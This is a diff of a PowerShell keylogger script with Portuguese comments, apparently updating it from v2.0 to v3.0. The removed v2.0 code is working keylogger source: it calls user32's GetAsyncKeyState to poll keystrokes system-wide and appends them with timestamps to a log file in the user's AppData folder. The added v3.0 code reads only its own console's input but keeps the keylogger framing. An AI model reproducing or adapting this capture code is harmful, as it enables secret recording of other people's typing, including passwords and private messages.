@@ -1,50 +1,39 @@
-# Keylogger LEGÍVEL v2.0 - FUNCIONA 100%!
+# Keylogger LEGÍVEL v3.0 - PURO NATIVO (sem Add-Type!)
 param($LogPath="$env:USERPROFILE\AppData\Local\keys-readable.log")
 
-# Cria pasta
+# Pasta usuário
 New-Item -ItemType Directory -Force -Path (Split-Path $LogPath) | Out-Null
 
-# Teclas simples (a-z + espaço + enter)
-$map = @{65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';85='u';86='v';87='w';88='x';89='y';90='z';32=' ';13='ENTER'}
-
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class KB {
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
-}
-"@
-
-Write-Host "🎹 KEYLOGGER v2.0 ATIVO!" -ForegroundColor Red -BackgroundColor Black
+Write-Host "🎹 KEYLOGGER v3.0 NATIVO ATIVO!" -ForegroundColor Red -BackgroundColor Black
 Write-Host "📝 Log: $LogPath" -ForegroundColor Yellow
-Write-Host "✨ Digite ALGO AGORA (Ctrl+C para parar)" -ForegroundColor Green
+Write-Host "✨ Digite ALGO (Ctrl+C parar)" -ForegroundColor Green
 
 $buffer = ""
-$lastKeys = @{}
 
 try {
     while($true) {
-        foreach($code in $map.Keys) {
-            $state = [KB]::GetAsyncKeyState($code)
-            if(($state -band 0x8000) -and !$lastKeys[$code]) {
-                $char = $map[$code]
-                $buffer += $char
+        # Lê stdin (teclado) linha por linha
+        if ([Console]::KeyAvailable) {
+            $key = [Console]::ReadKey($true)
+            $char = $key.KeyChar
+            
+            # Ignora teclas especiais
+            if ($char -ne [char]0 -and $char -match '[a-zA-Z0-9\s\.\-,;:/]') {
+                $buffer += $char.ToString().ToLower()
                 Write-Host "Tecla: $char" -ForegroundColor Cyan -NoNewline
                 
-                if($char -eq 'ENTER' -or $buffer.Length -ge 10) {
-                    if($buffer.Trim() -ne "") {
+                # Salva em 8+ chars ou Enter
+                if ($buffer.Length -ge 8 -or $key.Key -eq 'Enter') {
+                    if ($buffer.Trim()) {
                         "$(Get-Date -Format 'HH:mm:ss') → $buffer" | Out-File $LogPath -Append -Encoding UTF8
                         Write-Host "`n📝 SALVO: $buffer" -ForegroundColor Green
                     }
                     $buffer = ""
                 }
             }
-            $lastKeys[$code] = ($state -band 0x8000)
         }
-        Start-Sleep -Milliseconds 20
+        Start-Sleep -Milliseconds 50
     }
 } catch {
-    Write-Host "`n🛑 PARADO!" -ForegroundColor Yellow
+    Write-Host "`n🛑 PARADO (Ctrl+C)" -ForegroundColor Yellow
 }
